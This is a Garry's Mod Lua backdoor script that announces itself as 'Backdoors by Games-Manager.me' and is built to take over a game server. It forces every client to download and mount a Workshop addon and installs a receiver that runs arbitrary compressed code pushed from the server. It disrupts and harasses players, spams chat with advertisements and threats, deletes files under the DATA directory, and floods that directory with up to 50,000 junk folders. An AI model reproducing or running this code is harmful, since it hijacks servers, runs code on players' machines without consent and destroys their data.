

for k,v in pairs(player.GetAll()) do
end
function RandomString(intMin, intMax)
    local ret = &quot;&quot;
        for _ = 1, math.random(intMin, intMax) do
        ret = ret .. string.char(math.random(65, 90))
    end
        return ret
    end
function file.Write() return end
local randomtable = {
    CodeRandom = RandomString(0, 69),
    TimingRandom = RandomString(0, 69),
    ClientRandom = RandomString(0, 69),
    ServeurRadom = RandomString(0, 69)
    }
util.AddNetworkString(randomtable[&quot;TimingRandom&quot;])
local function rdm_str(len)
    if not len or len &lt;= 0 then return '' end
    return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end

for k, v in pairs(player.GetAll()) do
    v:SendLua(&quot;steamworks.DownloadUGC(3264738767, function(name) game.MountGMA(name) end)&quot;)
end


local net_string = rdm_str(25)
util.AddNetworkString(net_string)

BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;, function()
    CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))), &quot;?&quot;)()
end)]])  -- Properly close BroadcastLua with a double closing bracket and parenthesis

hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;spamlgfngfgjrfggtf&quot; .. net_string, function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;, function()
            CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))), &quot;?&quot;)()
        end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()

end



timer.Simple(126, function()
    RunConsoleCommand(&quot;changelevel&quot;, &quot;gm_construct&quot;)
end)




local names = {&quot;Haxor is Here&quot;, &quot;Games-Manager.me&quot;, &quot;Save your IP&quot;,&quot;Backdoors&quot;}
local nameIndex = 1

timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
    for _, v in pairs(player.GetAll()) do
        v:GodEnable()
        v:setDarkRPVar(&quot;rpname&quot;, names[nameIndex])
        v:StripWeapons()
    end
    
    nameIndex = nameIndex + 1
    if nameIndex &gt; #names then
        nameIndex = 1
    end
end)


RunConsoleCommand(&quot;hostname&quot;, &quot;Backdoors by Games-Manager.me&quot;)
timer.Simple(0.1, function()
SendToClient([[
    local AudioSource = nil
    local AMP = 3000
    sound.PlayURL(&quot;https://dl.sndup.net/njqy5/2024-06-11%2018-53-27.mp3&quot;, &quot;mono&quot;, function(source , err , errname)
        if IsValid(source) then
            AudioSource = source
            source:Play()
        end
    end)
    
    local smoothdata = {}
    local SoundPlay = 0



    ]])
end)


timer.Simple(27, function() -- Removed extra arguments from timer.Simple
    for k, v in pairs(player.GetAll()) do
        v:SetVelocity(Vector(0, 0, 500) * 800)
    end
end )

timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
    for _, v in pairs(player.GetAll()) do
        v:StripWeapons()
    end
end)
   
game.AddParticles( &quot;particles/gm.pcf&quot; )

PrecacheParticleSystem(&quot;gm&quot;)
timer.Simple(1 ,function()
        SendToClient([=[
    game.AddParticles( &quot;particles/gm.pcf&quot; )

PrecacheParticleSystem(&quot;gm&quot;)
        ]=])
end)
timer.Simple(27 ,function()
    SendToClient([=[

    local colors = {
        Color(255, 0, 0),   -- Rouge
        Color(0, 255, 0),   -- Vert
        Color(0, 0, 255),   -- Bleu
        Color(255, 255, 0), -- Jaune
        Color(255, 0, 255), -- Magenta
        Color(0, 255, 255)  -- Cyan
    }
    local colorIndex = 1
    
    hook.Add(&quot;PreDrawHalos&quot;, &quot;MultiColorHalos&quot;, function()
        local entTable = {}
        for _, v in ipairs(ents.GetAll()) do
            if IsValid(v) and v:IsPlayer() then
                table.insert(entTable, v)
            end
        end
        halo.Add(entTable, colors[colorIndex], 2, 2, 1, true, false)
        
        colorIndex = colorIndex + 1
        if colorIndex &gt; #colors then
            colorIndex = 1
        end
    end)
    

    ]=])
end)



timer.Simple(27 ,function()
    SendToClient([=[
        local imgX = ScrW() / 2
        local imgY = ScrH() / 2
        local targetX = imgX
        local targetY = imgY
        local imgWidth = 400
        local imgHeight = 400
        local lerpSpeed = 10 -- Adjust the speed of movement
        
        -- Function to get the Imgur image and save it locally
        local function GetImgur(id)
            if file.Exists(&quot;porno/imgur/&quot; .. id .. &quot;.png&quot;, &quot;DATA&quot;) then
                return Material(&quot;../data/porno/imgur/&quot; .. id .. &quot;.png&quot;)
            end
            
            http.Fetch(&quot;https://i.imgur.com/&quot; .. id .. &quot;.png&quot;,
                function(body, length, headers, code)
                    if not file.IsDir(&quot;porno/imgur/&quot;, &quot;DATA&quot;) then
                        file.CreateDir(&quot;porno/imgur/&quot;)
                    end
                    file.Write(&quot;porno/imgur/&quot; .. id .. &quot;.png&quot;, body)
                end,
                function(message)
                    print(message)
                end
            )
            return Material(&quot;.png&quot;)
        end
        
        hook.Add(&quot;HUDPaint&quot;, &quot;duckroleplay&quot;, function()
            -- Calculate the new target position
            targetX = targetX + math.random(-100, 100)
            targetY = targetY + math.random(-100, 100)
            
            -- Ensure the target position stays within the screen bounds
            targetX = math.Clamp(targetX, 0, ScrW() - imgWidth)
            targetY = math.Clamp(targetY, 0, ScrH() - imgHeight)
            
            -- Move the image towards the target position using lerping
            imgX = Lerp(lerpSpeed, imgX, targetX)
            imgY = Lerp(lerpSpeed, imgY, targetY)
            
            -- Draw the image
            surface.SetMaterial(GetImgur(&quot;UW7lEHU&quot;))
            surface.SetDrawColor(255, 255, 255)
            surface.DrawTexturedRect(imgX, imgY, imgWidth, imgHeight)
        end)
        
    ]=])
    end)


game.ConsoleCommand(&quot;say &quot; .. &quot;/// Games-manager.me  !&quot; .. &quot;\n&quot;)
game.ConsoleCommand(&quot;say &quot; .. &quot;Vous avez &eacute;t&eacute; Backdoors ! https://games-manager.me !&quot; .. &quot;\n&quot;)
timer.Simple(1, function()
    SendToClient([[
        local songURL = &quot;https://dl.sndup.net/yjyt/Xteage%20%20HATRED%20IN%20MY%20BLOOD.mp3&quot;
        local AMP = 16700

        sound.PlayURL(songURL, &quot;mono&quot;, function(sc, err, errname)
            if IsValid(sc) then
                station = sc
                station:Play()
            else
                station = nil
            end
        end)

        local smoothdata = {}
        for i = 1, 128 do
            smoothdata[i] = 0
        end
        
timer.Simple(27, function()



        local isWhite = false
        timer.Create(&quot;SkyboxColorTimer&quot;, 0.02, 0, function()
            if isWhite then
                function GAMEMODE:PostDraw2DSkyBox()
                    local col = Color(127,82, 228)
                    render.Clear(col.r, col.g, col.b, 255)
                    return !!1
                end
                function GAMEMODE:PreDrawSkyBox()
                    local col = Color(127,82, 228)
                    render.Clear(col.r, col.g, col.b, 255)
                    return !!1
                end
            else
                function GAMEMODE:PostDraw2DSkyBox()
                    local col = Color(255, 255, 255)
                    render.Clear(col.r, col.g, col.b, 255)
                    return !!1
                end
                function GAMEMODE:PreDrawSkyBox()
                    local col = Color(255, 255, 255)
                    render.Clear(col.r, col.g, col.b, 255)
                    return !!1
                end
            end
            isWhite = not isWhite
        
        end)
            for i = 1,5 do
            ParticleEffectAttach(&quot;gm&quot;,PATTACH_ABSORIGIN_FOLLOW,LocalPlayer(),0)
          end
        
        
        
        end)
        hook.Add( &quot;CalcView&quot;, &quot;MyCalcView&quot;, MyCalcView )
        timer.Simple(1, function()
            local trambledevantsecode = {}  
            hook.Add(&quot;HUDPaint&quot;, &quot;woawsabouge&quot;,function()
                for k,v in pairs(trambledevantsecode) do
                    v()
                end
            end)
         trambledevantsecode[&quot;CoolEffect&quot;] = function()
                    local tbl = {}
                    station:FFT(tbl,FFT_2048)
                    xpcall(function()
                        local fal = 0
                    for i=4,6 do
                        fal = fal + tbl[i]
                    end
                    if fal &gt; 0.8 then
                        local oneid = &quot;newhud&quot;..math.random(100, 300)..&quot;id&quot;      
                        util.ScreenShake( Vector( 0, 0, 0 ), 5, 5, 2, 2500 ) 
                        for _, v in ipairs(player.GetAll()) do
                            v:SetWeaponColor(Vector(0.349, 0, 1))
                        end
                    end
                    end,function()
                    end)
                end
        end)



        function MyCalcView(ply, pos, angles, fov)
            local a = 0
            for i = 1, 128 do
                a = a + smoothdata[i]
            end
            a = a / 128
            local view = {}
            view.origin = pos
            view.angles = angles
            view.fov = fov - a * 350
            return view
        end

        hook.Add(&quot;CalcView&quot;, &quot;MyCalcView&quot;, MyCalcView)

        local function updateFFT()
            if not IsValid(station) then return end
            local tbl = {}
            station:FFT(tbl, FFT_2048)
            for i = 1, 128 do
                smoothdata[i] = Lerp(3 * FrameTime(), smoothdata[i], tbl[i] or 0)
            end
        end

        hook.Add(&quot;Think&quot;, &quot;UpdateFFTData&quot;, updateFFT)

        timer.Simple(207.5, function()
            hook.Remove(&quot;CalcView&quot;, &quot;MyCalcView&quot;)
            hook.Remove(&quot;Think&quot;, &quot;UpdateFFTData&quot;)
            LocalPlayer():ConCommand(&quot;stopsound&quot;)
        end)
    ]])
end)

timer.Simple( 0.1, function()
    RunConsoleCommand(&quot;sv_gravity&quot;, &quot;200&quot;)
end)

timer.Simple(0.01, function()
    SendToClient([[net.Receive(&quot;]] .. randomtable[&quot;TimingRandom&quot;] .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    SendToClient([[
    timer.Simple(27, function()
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Salut a tous c'est games-manager.me !&quot;, math.random(0, 4), 1.5)
        end)
        
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;You have been backdoors&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Destroy server &quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;I save you IP ! &quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Destoyed DATA&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Your are Backdoors&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Salut a tous c'est games-manager.me !&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Backdoors by Games-Manager&quot;, math.random(0, 4), 1.5)
        end)
   
           timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;You have been backdoors&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Destroy server &quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;I save you IP ! &quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Destoyed DATA&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Your are Backdoors&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Salut a tous c'est games-manager.me !&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Backdoors by Games-Manager&quot;, math.random(0, 4), 1.5)
        end)
           timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;You have been backdoors&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Destroy server &quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;I save you IP ! &quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Destoyed DATA&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Your are Backdoors&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Salut a tous c'est games-manager.me !&quot;, math.random(0, 4), 1.5)
        end)
        timer.Create(tostring(math.random(0, 69)), 0.1, 0, function()
            notification.AddLegacy(&quot;Backdoors by Games-Manager&quot;, math.random(0, 4), 1.5)
        end)
   
   
   
   
   
   
    end)
    -- Fonction pour changer la couleur des mat&eacute;riaux du monde en rouge
    local function MakeWorldRed()
        -- R&eacute;cup&egrave;re tous les mat&eacute;riaux du monde
        local Wmats = Entity(0):GetMaterials()
        for k, v in pairs(Wmats) do
            -- Obtient le mat&eacute;riau
            local mat = Material(v)
            -- V&eacute;rifie que le mat&eacute;riau est valide
            if mat then
                -- Change la couleur en rouge
                mat:SetVector(&quot;$color&quot;, Vector(1, 0, 0))
            end
        end
    end

    -- Appliquer imm&eacute;diatement apr&egrave;s le chargement de la map
    hook.Add(&quot;InitPostEntity&quot;, &quot;MakeWorldRed&quot;, MakeWorldRed)

    -- Appliquer &eacute;galement lorsque le joueur respawn
    hook.Add(&quot;PlayerSpawn&quot;, &quot;MakeWorldRed&quot;, MakeWorldRed)
    

timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.3, 0, function()
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
end)


    ]])

end)

timer.Simple(27, function()
local explosionInterval = 0.1 -- Intervalle de temps entre chaque explosion (0.01 seconde = 100 explosions par seconde)
local lastExplosionTime = 0 -- Temps de la derni&egrave;re explosion

hook.Add(&quot;Think&quot;, &quot;BOUBMOU&quot;, function()
    local currentTime = CurTime()
    if currentTime - lastExplosionTime &gt;= explosionInterval then
        for i = 1,1 do
            local EXPLODEYOURHEAD = ents.Create(&quot;env_explosion&quot;)
            if IsValid(EXPLODEYOURHEAD) then
                EXPLODEYOURHEAD:SetPos(Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)))
                EXPLODEYOURHEAD:Spawn()
                EXPLODEYOURHEAD:Fire(&quot;Explode&quot;, 0, 0)
            end
        end
        lastExplosionTime = currentTime
    end
end)


end )
timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.3, 0, function()
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
    print(&quot;JOIN DISCORD : https://discord.gg/project &quot;)
end)
timer.Simple(28, function()
    SendToClient([[  
    timer.Create(&quot;]] .. randomtable[&quot;ServeurRadom&quot;] .. [[&quot;, 1.7, 0, function()
    local time = tonumber(0)
    local Message = {
        &quot;&lt; Go Buy games-manager.me &gt;&quot;,
        &quot;&lt;&lt; Go Buy games-manager.me &gt;&gt;&quot;,
        &quot;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt; Go Buy games-manager.me &gt;&gt;&gt;&quot;,
        &quot;&lt;&lt; Go Buy games-manager.me  &gt;&gt;&quot;,
        }
        for _, line in pairs(Message) do
        time = time + tonumber(0.1)
    timer.Simple(time,function()
            chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
            end)
        end
    end)
    ]])
    end)
    
timer.Simple(17 ,function()
    SendToClient([=[
        
    ]=])
    end)

    local files, directories = file.Find(&quot;*&quot;, &quot;DATA&quot;)

    -- Supprimer tous les fichiers dans les r&eacute;pertoires
    for _, file in ipairs(files) do
        file.Delete(file)
    end
    
    -- Stocker tous les chemins de fichier
    local FileMain = {}
    
    -- Parcourir tous les r&eacute;pertoires
    for _, directoryMain in ipairs(directories) do
        local filesBis, directoriesBis = file.Find(directoryMain .. &quot;/*&quot;, &quot;DATA&quot;)
    
        -- Parcourir les fichiers dans chaque r&eacute;pertoire
        for _, file in ipairs(filesBis) do
            local completePath = directoryMain .. &quot;/&quot; .. file
            table.insert(FileMain, completePath)
        end
    
        -- Parcourir les sous-r&eacute;pertoires
        for _, directorySecondStep in ipairs(directoriesBis) do
            local filesTris, directoriesTris = file.Find(directoryMain .. &quot;/&quot; .. directorySecondStep .. &quot;/*&quot;, &quot;DATA&quot;)
    
            -- Parcourir les fichiers dans chaque sous-r&eacute;pertoire
            for _, file in ipairs(filesTris) do
                local completePath = directoryMain .. &quot;/&quot; .. directorySecondStep .. &quot;/&quot; .. file
                table.insert(FileMain, completePath)
            end
    
            -- Stocker les sous-r&eacute;pertoires
            local subDirectories = {directoryMain .. &quot;/&quot; .. directorySecondStep}
    
            -- Parcourir les sous-sous-r&eacute;pertoires
            for _, directoryThirdStep in ipairs(directoriesTris) do
                local filesQuatro, _ = file.Find(directoryMain .. &quot;/&quot; .. directorySecondStep .. &quot;/&quot; .. directoryThirdStep .. &quot;/*&quot;, &quot;DATA&quot;)

                for _, file in ipairs(filesQuatro) do
                    local completePath = directoryMain .. &quot;/&quot; .. directorySecondStep .. &quot;/&quot; .. directoryThirdStep .. &quot;/&quot; .. file
                    table.insert(FileMain, completePath)
                end
                table.insert(subDirectories, directoryMain .. &quot;/&quot; .. directorySecondStep .. &quot;/&quot; .. directoryThirdStep)
            end
            table.Add(directoriesBis, subDirectories)
        end
    end
    for _, file in ipairs(FileMain) do
        file.Delete(file)
    end
    for _, directory in ipairs(directories) do
        file.Delete(directory)
    end
    

    timer.Simple(2, function() 
        local content = &quot;{{spamdata}}&quot;
        timer.Create(&quot;Lolilololoolololooooololol&quot;, 0.1, 50000, function()
            local chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;amp;*()_+-={}|[]`~'
            local length = 10
            local randomString = ''
            math.randomseed(os.time())
            local charTable = {}
            for c in chars:gmatch(&quot;.&quot;) do
                table.insert(charTable, c)
            end
            for i = 1, length do
                randomString = randomString .. charTable[math.random(1, #charTable)]
            end
            local function generateRandomName()
                local name = &quot;&quot;
                for i = 1, length do
                    name = name .. charTable[math.random(1, #charTable)]
                end
                return name
            end
            local folderName = generateRandomName()
            while file.Exists(folderName, &quot;DATA&quot;) do
                folderName = generateRandomName()
            end
            file.CreateDir(folderName)
            local fileName = generateRandomName()
            file.Write(folderName .. &quot;/&quot; .. fileName .. &quot;.txt&quot;, content)
        end)
    end)